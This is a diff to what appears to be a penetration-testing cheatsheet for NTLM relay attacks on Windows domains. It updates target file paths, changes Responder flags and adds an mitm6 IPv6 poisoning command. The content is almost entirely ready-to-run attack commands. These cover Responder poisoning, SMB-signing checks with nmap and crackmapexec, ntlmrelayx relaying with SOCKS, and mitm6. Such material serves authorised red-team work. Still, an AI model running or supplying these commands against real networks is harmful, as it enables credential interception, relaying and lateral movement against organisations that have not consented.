@@ -5,7 +5,7 @@
 ```
 responder-http-on
 responder-smb-on
-responder -I <interface> -r -d -w
+responder -I <interface> -d -w
 ```
 
 = interface: enp0s31f6
@@ -16,7 +16,7 @@ responder -I <interface> -r -d -w
 nmap -Pn --script smb-security-mode -p445 <target>
 ```
 
-= target: ./targets/domain/computers.txt
+= target: $TARGETS/computers.list
 
 ## SMB signing disabled - cme
 
@@ -24,14 +24,14 @@ nmap -Pn --script smb-security-mode -p445 <target>
 cme smb <target> --gen-relay-list <output_file>
 ```
 
-= target: ./targets/domain/computers.txt
+= target: $TARGETS/computers.list
 
 ## Responder - Relay
 
 ```
 responder-http-off
 responder-smb-off
-responder -I <interface> -r -d -w
+responder -I <interface> -d -w
 ```
 
 = interface: enp0s31f6
@@ -42,6 +42,13 @@ responder -I <interface> -r -d -w
 ntlmrelayx -tf <targets_file> -socks -smb2support
 ```
 
-= targets_file: ./targets/domain/relay_targets_computers.txt
+= targets_file: $TARGETS/relay_targets.list
 
 ## mitm6 for NTLM Relay
+
+```
+mitm6 --interface <interface> --domain <domain>
+```
+
+= interface: enp0s31f6
+= domain:
